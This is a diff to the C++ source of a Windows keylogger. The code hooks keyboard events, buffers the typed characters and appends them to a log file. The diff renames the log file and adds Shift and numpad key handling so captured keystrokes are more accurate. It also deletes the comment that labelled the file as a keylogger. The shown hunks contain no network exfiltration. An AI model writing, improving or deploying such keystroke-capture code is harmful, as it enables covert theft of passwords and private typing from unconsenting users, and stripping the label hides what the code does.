@@ -1,5 +1,3 @@
-// unicode keylogger
-
 #include <iostream>
 #include <windows.h>
 #include <fstream>
@@ -20,7 +18,7 @@ wstring pre_app_name = L" ";
 
 void save_in_file(wchar_t str[])
 {
-    wofstream  fileS{ "D:\\zfor_fun.txt",ios_base::app };//open file
+    wofstream  fileS{ "D:\\zlogs.txt",ios_base::app };//open file
     locale loc(locale(), new codecvt_utf8<wchar_t>);//define utf8
     fileS.imbue(loc);//set utf_8 to output stream of file
 
@@ -136,10 +134,15 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '*'; //encouter * numlock
             uni_c = 0;
         }
+
         else if (key == VK_OEM_MINUS) {
-            buf[count_char++] = '-';
+            if (SHIFT_key) {
+                buf[count_char++] = '_';
+            }
+            else buf[count_char++] = '-';
             uni_c = 0;
-        }//encouter - numlock
+        }
+
         else if (key == VK_ADD) {
             buf[count_char++] = '+'; //encouter + numlock
             uni_c = 0;
@@ -148,6 +151,11 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '/'; //encouter + numlock
             uni_c = 0;
         }
+        else if (key == VK_SUBTRACT) {
+            buf[count_char++] = '-'; //encouter + numlock
+            uni_c = 0;
+        }
+        
         else if (key == VK_OEM_PERIOD) {//encouter . 
             if (SHIFT_key) {
                 buf[count_char++] = '>';
